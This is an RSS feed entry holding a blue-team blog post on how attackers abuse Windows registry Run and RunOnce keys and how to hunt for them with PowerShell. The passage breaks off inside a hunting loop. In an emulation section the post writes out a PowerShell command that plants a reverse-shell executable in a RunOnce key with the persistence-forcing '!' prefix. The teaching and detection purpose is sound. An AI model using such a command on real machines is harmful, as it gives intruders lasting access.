&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt; &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dray Agha,&lt;/strong&gt; Security Researcher&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image2.png&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Running Once, &lt;del&gt;Running Twice&lt;/del&gt;, Pwned! Windows Registry Run Keys</title>
      <link>//localhost:1313/articles/2021/08/2021-08-11-running-once-running-twice-pwned-windows-registry-run-keys/</link>
      <pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/08/2021-08-11-running-once-running-twice-pwned-windows-registry-run-keys/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;By Dray Agha&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Jumpsec_icons_Physical-security-2.png&#34; alt=&#34;Jumpsec icons Physical security 2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The Windows registry is a vast and complex topic and cannot be understood and defended in one article. One particular area of interest from a security perspective is registry run keys. In this article, we discuss who uses run keys, how to uncover abuse, and how to eradicate evil from them. &lt;/p&gt;
&lt;h2&gt;An Introduction to Run Keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;an-introduction-to-run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#an-introduction-to-run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;What are registry run keys?&lt;/em&gt;&lt;/strong&gt; Run keys are an obscure mechanism of the registry to execute something on a Windows system when a user logs in or the machine boots up. &lt;/p&gt;
&lt;p&gt;A number of advanced adversaries have abused run keys due to their problematic nature. For example, &lt;a href=&#34;https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Fancy Bear&lt;/strong&gt;&lt;/a&gt; (also known as &lt;a href=&#34;https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;APT28&lt;/strong&gt;&lt;/a&gt;), &lt;a href=&#34;https://www.proofpoint.com/us/blog/threat-insight/i-knew-you-were-trouble-ta456-targets-defense-contractor-alluring-social-media&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;TA456&lt;/strong&gt;&lt;/a&gt;, and &lt;a href=&#34;https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Group 123&lt;/strong&gt;&lt;/a&gt; enjoy weaponizing run keys to achieve persistent access to a compromised network. Run keys have housed all manner of malicious content - from simple executables to macro-riddled spreadsheets.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK® records this particular persistence tactic as the sub-technique &lt;a href=&#34;https://attack.mitre.org/techniques/T1547/001/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;T1547.001&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt; It is not a super common technique for adversarial campaigns, however it can offer ardent persistence - all the more reason for you and I to explore this obscurity further. &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_16-53.png&#34; alt=&#34;2021 07 28 16 53&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Though advanced attackers abuse run keys on occasion, &lt;strong&gt;I find it is a mechanism that is not discussed widely enough, even though it is quite straightforward to query run keys for evil.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;The silence on this registry capability isn’t from technical gaps across the infosec community. &lt;strong&gt;Rather, run keys are an unexpected executable component of the ‘config database’ that is the Windows registry.&lt;/strong&gt; This means they often don’t get the same level of attention compared to bigger, more well-known attacker techniques and OS components. However, I recently came across this interesting snippet on the infosec social circuit:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-02_17-15.png&#34; alt=&#34;2021 08 02 17 15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Before we get into how to hunt for malicious run keys, &lt;strong&gt;let’s detour down the Windows registry.&lt;/strong&gt; &lt;/p&gt;
&lt;h2&gt;The Windows Registry&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-windows-registry&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-windows-registry&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The Windows registry is a labyrinthine place. On the surface it presents itself as a &lt;a href=&#34;https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;centralised database&lt;/strong&gt;&lt;/a&gt; to store information pertaining to user and machine settings. &lt;strong&gt;The reality is that it’s more a menagerie of weird and wonderful capabilities&lt;/strong&gt; that Microsoft sometimes obscurely document, despite these capabilities possessing devastating potential.&lt;/p&gt;
&lt;p&gt;I could spend hours writing about the inconsistencies and capriciousness of the Windows registry. Trying to understand the limits and parameters of its potential is truly maddening. It seems like the byzantine &lt;strong&gt;nature of the registry offers an adversary an unfair advantage&lt;/strong&gt; to stash away their persistence mechanisms and skulk outside the network until the Blue Team has averted their gaze. &lt;/p&gt;
&lt;p&gt;Trying to decipher what is benign and what is malevolent in the windows registry can be considered Sisyphean, especially during an incident.&lt;/p&gt;
&lt;h2&gt;Run keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I hope so far I have conveyed just how difficult it is to tame the registry. To make matters worse, run key capabilities are criminally under-documented by Microsoft, who &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;devote a mere six paragraphs&lt;/strong&gt;&lt;/a&gt; to them.&lt;/p&gt;
&lt;p&gt;Run keys live in the registry. They are configurable to allow a program to execute when a user logs in or the computer is turned on.  “&lt;em&gt;But hold on!&lt;/em&gt;”, I hear you angrily cry, “&lt;em&gt;Windows already has a&lt;/em&gt; &lt;strong&gt;&lt;em&gt;Task Scheduler&lt;/em&gt;&lt;/strong&gt;, &lt;em&gt;THAT’S how you schedule tasks!!!&lt;/em&gt;”&lt;/p&gt;
&lt;p&gt;Well, not according to our Lord and Saviour Bill Gates. Moreover, run keys have some crucial differences that make comparisons to Windows’ &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Task Scheduler&lt;/strong&gt;&lt;/a&gt; somewhat limited.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/memes-1.png&#34; alt=&#34;memes 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In contrast to Windows Task Scheduler, &lt;strong&gt;registry run keys possess a number of unique characteristics&lt;/strong&gt;:&lt;/p&gt;
&lt;h3&gt;Character Limitations&lt;span class=&#34;absolute -mt-20&#34; id=&#34;character-limitations&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#character-limitations&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Run keys can only store commands that are less than 280 characters.&lt;/strong&gt; So an adversaries’ one-liner must form as few characters as a Tweet. I hope Microsoft didn’t intend for THAT to be a low-tier defence mechanism, as your basic script-kiddie reverse shell will barely cost you 50 characters. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_15-43.png&#34; alt=&#34;2021 07 28 15 43&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Moreover, compiling your own malicious executable and firing it off via the run keys will cost you very few characters but achieve maximum effect. So whilst the character limitation is unique compared to other system timers, it’s a trivial obstacle. &lt;/p&gt;
&lt;h3&gt;Special Character Behaviour&lt;span class=&#34;absolute -mt-20&#34; id=&#34;special-character-behaviour&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#special-character-behaviour&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Another unique feature of run key considers how special characters change the behaviour of the scheduled command.&lt;/strong&gt; Specifically, the &lt;strong&gt;exclamation mark&lt;/strong&gt;  ( ! ) and the &lt;strong&gt;asterisk /&lt;/strong&gt; &lt;strong&gt;wildcard&lt;/strong&gt; ( * ). By default, the run key wipes itself after execution - whether it fails to execute its task or not. These two special characters can be deployed to alter this behaviour.&lt;/p&gt;
&lt;p&gt;If, on your next threat hunting session or incident response, you see this bad boy right here with an exclamation mark, you have encountered a run key that will persist until it has run its allocated command for sure. &lt;strong&gt;If for whatever reason the evil command does not run, the exclamation mark ensures that it will not delete itself until it runs successfully.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-24.png&#34; alt=&#34;2021 07 28 09 24&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The prefixed exclamation of a run key can be defeated by booting the computer in Safe Mode.&lt;/strong&gt; To ensure that a run key is executed regardless of boot mode, &lt;strong&gt;an adversary can leverage an asterisk / wildcard which forces the command to run.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-26.png&#34; alt=&#34;2021 07 28 09 26&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Run keys are configured to wipe themselves after running, by default, which means that unless your logging and detection is sharp, these kinds of malicious activities could go by unnoticed, unless you go through the painstaking  process of forensically recovering the image of the machine&lt;/p&gt;
&lt;h1&gt;Hunting Run Keys&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;images/2021-07-28_16-11.png&#34; alt=&#34;2021 07 28 16 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Is this your face right now? This was my face when I first encountered run keys. This may actually be my face all the time, to be honest. &lt;em&gt;#blueteamproblems&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Although run keys may seem complicated and obscure, &lt;strong&gt;I promise you they are anything but.&lt;/strong&gt; They are wonderfully easy to query and monitor, and they show up fabulously in a SIEM when an adversary manipulates their values. &lt;strong&gt;Let’s prove it together.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Finding Run Keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;finding-run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#finding-run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are a number of places where malicious run keys can be deployed. We’re just going to focus on the top four locations, but if you read some &lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;red team documentation&lt;/strong&gt;&lt;/a&gt; you’ll find some more registry locations to deploy run key persistence. &lt;/p&gt;
&lt;p&gt;Anyway, in the Windows registry, if you look under HKey Local Machine and Current User, and traverse a couple of directories, you’ll find &lt;strong&gt;Run&lt;/strong&gt; and &lt;strong&gt;RunOnce.&lt;/strong&gt; &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;The directories are important here.&lt;/strong&gt; The behaviour of the run key is contingent on the registry location it is written in: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you see something written in &lt;strong&gt;HKLM:\&lt;/strong&gt; it means this was written as a &lt;strong&gt;high-privileged&lt;/strong&gt; user (most likely Admin) or SYSTEM.
&lt;ul&gt;
&lt;li&gt;Run keys written here can &lt;strong&gt;execute when the machine boots up&lt;/strong&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If you see something something written in &lt;strong&gt;HKCU:\&lt;/strong&gt; it means this was written as just a &lt;strong&gt;normal user&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Run keys written here will &lt;strong&gt;only execute when the user logs in&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If you see something written to &lt;strong&gt;\RunOnce&lt;/strong&gt; it &lt;strong&gt;will&lt;/strong&gt; be removed after execution&lt;/li&gt;
&lt;li&gt;If you see something written in &lt;strong&gt;\Run&lt;/strong&gt; it &lt;strong&gt;will not&lt;/strong&gt; be removed after execution
&lt;ul&gt;
&lt;li&gt;These can be complicated by the &lt;strong&gt;special character behaviour&lt;/strong&gt; that we already discussed.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What do Run Keys look like IRL ?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-do-run-keys-look-like-irl-&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-do-run-keys-look-like-irl-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In real life, you actually have to sift a little bit of the registry’s noise to get to the meat of a run key.&lt;/strong&gt; Allow me to share with you two examples, where the first has not been filtered with PowerShell, and the second is enjoying a luxurious yet temporal life as filtered PowerShell.&lt;/p&gt;
&lt;p&gt;Look at this mess. What even is this? &lt;strong&gt;We don’t even need the stuff highlighted in the red box, it’s just noise.&lt;/strong&gt; We know this is the ‘HKLM’ Drive and ‘Run’ ChildName…&amp;hellip;we know that because we are the ones who traversed here! Honestly…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_17-20-1024x349.png&#34; alt=&#34;2021 07 28 17 20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Let’s filter out the noise with some PowerShell:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/124326535-76c64680-db7e-11eb-9b98-261b3704d30a.png&#34; alt=&#34;124326535 76c64680 db7e 11eb 9b98 261b3704d30a&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Look at how superior this is. Imagine running this glorious filtered-one-liner, and getting thousands of endpoints returning information in this kind of clear, noise-free way; the stuff Blue Team dreams are made of. &lt;strong&gt;This kind of filtered PowerShell is fantastically suited to be run enterprise-wide to identify anomalies beyond the standard builds across your network.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If you look in the run keys, you&amp;rsquo;ll find the entries’ name and accompanying commands &lt;em&gt;(name: command).&lt;/em&gt; The legitimate contents of the run keys can vary and it’s your task to understand what is normal in your enterprise, as this will allow abnormal inconsistencies to stand out. &lt;/p&gt;
&lt;p&gt;As you hunt, you may want to filter out legitimate startup items in the registry runkeys. This is easily done. Using the same PowerShell as above, we can use the `-exclude` flag which already removes `PS*`. Just add a comma, and remove the other run key names that you don’t want to see. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Vmware&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bginfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-03_16-21.png&#34; alt=&#34;2021 08 03 16 21&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Malicious Run Keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;malicious-run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#malicious-run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let us emulate some of the adversaries&amp;rsquo; behaviour. We will insert some malice onto a run key, and then I will show you:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;First,&lt;/strong&gt; how to loop through and find it automatically;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Second,&lt;/strong&gt; how you eradicate it from the machine without damaging the other legitimate run keys.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Pretend we have pwned a machine, and are looking to maintain persistence. We compile evilcommand.exe, which bypasses all anti-virus known to man and gives us a reverse shell. &lt;strong&gt;We can force one of the run keys to execute our malicious program&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Set-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!Delete After Running&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Value&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;evilcommand.exe&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;If you append `-whatif` to the end of a lot of powershell one-liners, it will not actually run your command. Instead, it will show you what the effect COULD be if you ran it. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-04-1024x110.png&#34; alt=&#34;2021 07 28 09 04&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;When you want to really run something, tag on `-verbose` so you can get confirmation that the PowerShell you expected has taken effect.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-06-1024x128.png&#34; alt=&#34;2021 07 28 09 06&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Without all of the noise, this is what we have forcibly co-opted the run key to do for us: we have created a run key named “&lt;strong&gt;Delete_After_Running&lt;/strong&gt;”, whose execution &lt;strong&gt;value&lt;/strong&gt; will be “&lt;strong&gt;evilcommand.exe&lt;/strong&gt;”. Notice the &lt;strong&gt;exclamation point&lt;/strong&gt;, which as we have discussed will ensure the program will run before it self-deletes, guaranteeing our successful re-entry to this compromised machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-11-1024x142.png&#34; alt=&#34;2021 07 28 09 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Task Scheduler is oblivious to this&lt;/strong&gt;. It does not and cannot recognise that this run key task has been scheduled. If I were Microsoft, I’d probably include that functionality in Task Scheduler…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_15-36-1024x491.png&#34; alt=&#34;2021 07 28 15 36&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Finding Run Key evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;finding-run-key-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#finding-run-key-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A quick Powershell ‘for loop’ can collect the contents of these four registry locations.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;When drafting this script, I (and now you, too) made life easier by ensuring the code produced output that was &lt;strong&gt;pre-filtered and added colours&lt;/strong&gt;. This will make our task that bit easier to determine &lt;strong&gt;IF&lt;/strong&gt; something &lt;strong&gt;abnormal&lt;/strong&gt; (read: evil) exists and &lt;strong&gt;WHERE&lt;/strong&gt; it exists.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$items&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span 